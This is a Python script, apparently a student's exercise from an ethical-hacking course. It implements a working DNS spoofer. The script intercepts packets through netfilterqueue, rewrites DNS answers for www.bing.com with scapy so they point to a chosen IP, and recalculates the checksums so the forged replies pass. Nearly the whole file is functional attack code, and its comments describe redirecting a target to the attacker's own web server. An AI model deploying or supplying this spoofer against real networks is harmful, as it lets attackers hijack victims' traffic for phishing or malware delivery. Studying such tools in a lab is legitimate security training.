#!/usr/bin/env python

##########################################################################################################
#
# Author: Brenyn Kissoondath
# Course: Learn Python and Ethical Hacking From Scratch - StationX
# Instructor: Zaid Al Quraishi
# Purpose: Create a dns spoofer
# Input(s): 
# Output(s): 
#
# Notes to self: scapy_packet[scapy.DNS].ancount
#				 					  ^layer   ^field
##########################################################################################################
import netfilterqueue
import scapy.all as scapy

def process_packet(packet):
	scapy_packet = scapy.IP(packet.get_payload()) #convert netfilterqueue packet into scapy packet so we can use scapy filters
	if scapy_packet.haslayer(scapy.DNSRR): #if the scapy packet has a dns response record
		qname = scapy_packet[scapy.DNSQR].qname #website name is stored in qname variable within DNS Question Record layer
		if "www.bing.com" in qname: # if the target is visiting the specified website
			print("[+] Spoofing target")
			answer = scapy.DNSRR(rrname = qname, rdata = "172.217.164.228") #create a packet that spoofs bing's ip to redirect target where we want ie our kali webserver (or google in this case because i am too lazy to start my kali webserver)
			scapy_packet[scapy.DNS].an = answer #replace dns answer field with our spoofed response
			scapy_packet[scapy.DNS].ancount = 1

			del scapy_packet[scapy.IP].len
			del scapy_packet[scapy.IP].chksum
			del scapy_packet[scapy.UDP].len
			del scapy_packet[scapy.UDP].chksum
			# if we dont delete the original checksum and length the packet will appear corrupt
			# when we delete scapy will calculate new length and checksum for our modified response

			packet.set_payload(str(scapy_packet))
			
	packet.accept()

queue = netfilterqueue.NetfilterQueue() #redirect traffic through netfilterqueue
queue.bind(0, process_packet) #direct packets to process_packet where they are turned into scapy packets, analysed and acted upon
queue.run()